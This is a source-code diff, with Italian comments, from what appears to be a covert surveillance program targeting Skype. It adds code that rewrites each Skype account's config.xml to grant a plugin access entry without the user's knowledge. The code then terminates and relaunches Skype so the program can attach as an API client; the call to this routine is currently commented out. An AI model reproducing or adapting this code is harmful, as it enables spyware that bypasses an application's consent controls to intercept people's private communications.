@@ -1910,16 +1910,238 @@ BOOL IsSkypePMInstalled()
 	return FALSE;
 }
 
-// Monitora costantemente la presenza di SkypePM
+#define GENERIC_FIELD_LEN 256
+char *GetXMLNodeA(char *data, char *node, char *buffer)
+{
+	char *ptr1, *ptr2;
+	char saved_char;
+	memset(buffer, 0, GENERIC_FIELD_LEN);
+	if (data == NULL)
+		return NULL;
+	if ( !(ptr1 = strstr(data, node)) )
+		return NULL;
+	if ( !(ptr1 = strchr(ptr1, L'>')) )
+		return NULL;
+	if ( !(ptr2 = strchr(ptr1, L'<')) )
+		return NULL;
+	saved_char = *ptr2;
+	ptr1++; *ptr2 = 0;
+	strncpy_s(buffer, GENERIC_FIELD_LEN, ptr1, _TRUNCATE);
+	*ptr2 = saved_char;
+	return ptr2;	
+}
+
+BOOL CheckACL(char *key1, char *key2, char *key3, char *key4, char *path)
+{
+	// XXX TODO
+	if (!strcmp(key1, "k1"))
+		return TRUE;
+	return FALSE;
+}
+
+BOOL IsACLPresent(WCHAR *config_path)
+{
+	HANDLE hFile;
+	HANDLE hMap;
+	DWORD config_size;
+	char *config_map;
+	char *local_config_map, *ptr;
+	BOOL acl_found = FALSE;
+	char key1[GENERIC_FIELD_LEN], key2[GENERIC_FIELD_LEN], key3[GENERIC_FIELD_LEN], key4[GENERIC_FIELD_LEN], path[GENERIC_FIELD_LEN];
+
+	// Mappa in memoria il file di config
+	if ((hFile = FNC(CreateFileW)(config_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
+		return FALSE;
+	
+	config_size = GetFileSize(hFile, NULL);
+	if (config_size == INVALID_FILE_SIZE) {
+		CloseHandle(hFile);
+		return FALSE;
+	}
+	
+	local_config_map = (char *)calloc(config_size + 1, sizeof(char));
+	if (local_config_map == NULL) {
+		CloseHandle(hFile);
+		return FALSE;
+	}
+
+	if ((hMap = FNC(CreateFileMappingA)(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == INVALID_HANDLE_VALUE) {
+		SAFE_FREE(local_config_map);
+		CloseHandle(hFile);
+		return FALSE;
+	}
+
+	if ( (config_map = (char *)FNC(MapViewOfFile)(hMap, FILE_MAP_READ, 0, 0, 0)) ) {
+		memcpy(local_config_map, config_map, config_size);
+		FNC(UnmapViewOfFile)(config_map);
+		ptr = local_config_map;
+		// Vede se ce una chiave che matcha
+		while (ptr = GetXMLNodeA(ptr, "Key1", key1)) {
+			ptr = GetXMLNodeA(ptr, "Key2", key2);
+			ptr = GetXMLNodeA(ptr, "Key3", key3);
+			ptr = GetXMLNodeA(ptr, "Key4", key4);
+			ptr = GetXMLNodeA(ptr, "Path", path);
+			if (CheckACL(key1, key2, key3, key4, path)) {
+				acl_found = TRUE;
+				break;
+			}
+		}
+	}
+	SAFE_FREE(local_config_map);
+	CloseHandle(hMap);
+	CloseHandle(hFile);
+
+	return acl_found;
+}
+
+BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char *key4, char *path)
+{
+	HANDLE hFile;
+	HANDLE hMap;
+	DWORD config_size, first_part_size;
+	char *config_map;
+	char *local_config_map, *ptr = NULL;
+	BOOL acl_missing = FALSE;
+	DWORD dummy;
+
+	// Fa una copia del file in memoria
+	if ((hFile = FNC(CreateFileW)(config_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
+		return FALSE;
+	
+	config_size = GetFileSize(hFile, NULL);
+	if (config_size == INVALID_FILE_SIZE) {
+		CloseHandle(hFile);
+		return FALSE;
+	}
+	
+	local_config_map = (char *)calloc(config_size + 1, sizeof(char));
+	if (local_config_map == NULL) {
+		CloseHandle(hFile);
+		return FALSE;
+	}
+
+	if ((hMap = FNC(CreateFileMappingA)(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == INVALID_HANDLE_VALUE) {
+		SAFE_FREE(local_config_map);
+		CloseHandle(hFile);
+		return FALSE;
+	}
+
+	if (! (config_map = (char *)FNC(MapViewOfFile)(hMap, FILE_MAP_READ, 0, 0, 0)) ) {
+		SAFE_FREE(local_config_map);
+		CloseHandle(hMap);
+		CloseHandle(hFile);
+		return FALSE;
+	}
+
+	memcpy(local_config_map, config_map, config_size);
+	FNC(UnmapViewOfFile)(config_map);
+	CloseHandle(hMap);
+	CloseHandle(hFile);
+	
+	// Vede se manca la sezione <AccessContrlList>
+	if (!(ptr = strstr(local_config_map, "</AccessControlList>"))) {
+		acl_missing = TRUE;
+		ptr = strstr(local_config_map, "</C>");
+	}
+	if (!ptr) {
+		SAFE_FREE(local_config_map);
+		return FALSE;
+	}
+	// Apre il file in scrittura e ci scrive dentro...
+	if ((hFile = FNC(CreateFileW)(config_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, TRUNCATE_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE) {
+		SAFE_FREE(local_config_map);
+		return FALSE;
+	}
+	first_part_size = ptr - local_config_map;
+	WriteFile(hFile, local_config_map, first_part_size, &dummy, NULL);
+	if (acl_missing)
+		WriteFile(hFile, "<AccessControlList>\r\n", strlen("<AccessControlList>\r\n"), &dummy, NULL);
+	WriteFile(hFile, "<Client98>\r\n<Key1>", strlen("<Client98>\r\n<Key1>"), &dummy, NULL);
+	WriteFile(hFile, key1, strlen(key1), &dummy, NULL);
+	WriteFile(hFile, "</Key1>\r\n", strlen("</Key1>\r\n"), &dummy, NULL);
+	WriteFile(hFile, "<Key2>", strlen("<Key2>"), &dummy, NULL);
+	WriteFile(hFile, key2, strlen(key2), &dummy, NULL);
+	WriteFile(hFile, "</Key2>\r\n", strlen("</Key2>\r\n"), &dummy, NULL);
+	WriteFile(hFile, "<Key3>", strlen("<Key3>"), &dummy, NULL);
+	WriteFile(hFile, key3, strlen(key3), &dummy, NULL);
+	WriteFile(hFile, "</Key3>\r\n", strlen("</Key3>\r\n"), &dummy, NULL);
+	WriteFile(hFile, "<Key4>", strlen("<Key4>"), &dummy, NULL);
+	WriteFile(hFile, key4, strlen(key4), &dummy, NULL);
+	WriteFile(hFile, "</Key4>\r\n", strlen("</Key4>\r\n"), &dummy, NULL);
+	WriteFile(hFile, "<Path>", strlen("<Path>"), &dummy, NULL);
+	WriteFile(hFile, path, strlen(path), &dummy, NULL);
+	WriteFile(hFile, "</Path>\r\n</Client98>\r\n", strlen("</Path>\r\n</Client98>\r\n"), &dummy, NULL);
+	if (acl_missing)
+		WriteFile(hFile, "</AccessControlList>\r\n", strlen("</AccessControlList>\r\n"), &dummy, NULL);
+	WriteFile(hFile, ptr, config_size - first_part_size, &dummy, NULL);
+
+	SAFE_FREE(local_config_map);
+	CloseHandle(hFile);
+	return TRUE;
+}
+
+void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
+{
+	WCHAR skype_data[MAX_PATH];
+	WCHAR skype_search[MAX_PATH];
+	WCHAR config_path[MAX_PATH];
+	char skype_exe_path[MAX_PATH];
+	WIN32_FIND_DATAW find_data;
+	HANDLE hFind, hSkype;
+	BOOL is_to_respawn = FALSE;
+
+	// Trova il path di %appdata%\Skype
+	if(!FNC(GetEnvironmentVariableW)(L"appdata", skype_data, MAX_PATH)) 
+		return;
+	wcscat_s(skype_data, MAX_PATH, L"\\Skype\\");
+	_snwprintf_s(skype_search, sizeof(skype_search)/sizeof(WCHAR), _TRUNCATE, L"%s\\*", skype_data); 
+	_snprintf_s(skype_exe_path, sizeof(skype_exe_path), _TRUNCATE, "%S\\Phone\\Skype.exe", skype_path); 
+
+	// Cicla tutte le directory degli account
+	hFind = FNC(FindFirstFileW)(skype_search, &find_data);
+	if (hFind == INVALID_HANDLE_VALUE)
+		return;
+	do {
+		if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+			if (find_data.cFileName[0] == L'.')
+				continue;
+			_snwprintf_s(config_path, sizeof(config_path)/sizeof(WCHAR), _TRUNCATE, L"%s\\%s\\config.xml", skype_data, find_data.cFileName); 
+			// Verifica se contiene gia' la permission altrimenti la scrive
+			if (!IsACLPresent(config_path))
+				// XXX TODO 
+				if (WriteSkypeACL(config_path, "k1", "k2", "k3", "k4", "path"))
+					is_to_respawn = TRUE;
+		}
+	} while (FNC(FindNextFileW)(hFind, &find_data));
+	FNC(FindClose)(hFind);
+
+	// Se ne scrive almeno una, killa e respawna skype
+	if (is_to_respawn) {
+		if (hSkype = OpenProcess(PROCESS_TERMINATE, FALSE, skype_pid)) {
+			STARTUPINFO si;
+			PROCESS_INFORMATION pi;
+
+			TerminateProcess(hSkype, 0);
+			CloseHandle(hSkype);
+			ZeroMemory( &si, sizeof(si) );
+		    si.cb = sizeof(si);
+			//si.wShowWindow = SW_SHOW;
+			//si.dwFlags = STARTF_USESHOWWINDOW;
+			HM_CreateProcess(skype_exe_path, 0, &si, &pi, 0);
+		}
+	}
+}
+
+// Monitora costantemente la possibilita' di attaccarsi come API client a Skype
 DWORD WINAPI MonitorSkypePM(BOOL *semaphore)
 {
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 	DWORD skipe_id;
 	HANDLE skype_handle;
-	char skype_path[MAX_PATH];
-	char *skype_pm_ptr;
-	char skype_pm_path[MAX_PATH];
+	WCHAR skype_path[MAX_PATH];
+	WCHAR *skype_pm_ptr;
+	WCHAR skype_pm_path[MAX_PATH];
 
 	LOOP {
 		for (DWORD i=0; i<7; i++) {
@@ -1931,15 +2153,17 @@ DWORD WINAPI MonitorSkypePM(BOOL *semaphore)
 		// e lo esegue
 		if ( (skipe_id = HM_FindPid("skype.exe", TRUE)) ) {
 			if ( (skype_handle = FNC(OpenProcess)(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, skipe_id)) ) {
-				if (FNC(GetModuleFileNameExA)(skype_handle, NULL, skype_path, sizeof(skype_path)-1)) {
-					if (skype_pm_ptr = strstr(skype_path, "\\Phone\\")) {
+				if (FNC(GetModuleFileNameExW)(skype_handle, NULL, skype_path, (sizeof(skype_path)/sizeof(WCHAR))-1)) {
+					if (skype_pm_ptr = wcsstr(skype_path, L"\\Phone\\")) {
 						*skype_pm_ptr = 0;
-						_snprintf_s(skype_pm_path, sizeof(skype_pm_path), _TRUNCATE, "%s\\Plugin Manager\\skypePM.exe", skype_path);		
+						_snwprintf_s(skype_pm_path, sizeof(skype_pm_path)/sizeof(WCHAR), _TRUNCATE, L"%s\\Plugin Manager\\skypePM.exe", skype_path);		
 						// Vede se esiste il file
-						HANDLE	fileh = FNC(CreateFileA)(skype_pm_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+						HANDLE	fileh = FNC(CreateFileW)(skype_pm_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
 						if (fileh != INVALID_HANDLE_VALUE)
 							CloseHandle(fileh);
 						else  {// Non c'e' lo skypePM quindi cerca di fare l'attach al processo
+							// Prima di cercare di fare l'attach controlla che ci siano i giusti permessi...
+							//CheckSkypePluginPermissions(skipe_id, skype_path);
 							UINT msg_type = RegisterWindowMessage("SkypeControlAPIDiscover");
 							HM_SafeSendMessageTimeoutW(HWND_BROADCAST, msg_type, (WPARAM)g_report_hwnd, (LPARAM)NULL, SMTO_NORMAL, 500, NULL);
 						}
